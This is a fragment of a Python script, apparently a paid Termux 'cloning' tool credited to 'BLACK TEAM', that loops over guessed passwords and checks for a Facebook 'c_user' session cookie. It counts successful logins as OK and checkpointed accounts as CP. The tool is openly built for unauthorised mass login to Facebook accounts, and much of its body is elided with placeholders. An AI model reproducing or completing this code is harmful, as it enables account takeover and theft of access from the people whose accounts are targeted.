...

  ...
  AUTHOR   :   BLACK TEAM
  FACEBOOK :   ALMAS NAFAS M.M.M
  GITHUB    :   AfghanHack001
  LIFE STATUS  :   LIVE 
  FB GROUP  : TERMUX COMMAND
  TOOL STATUS :  PAID                             
\033[1;91m=========================================================="""
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[CLONING.. ] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
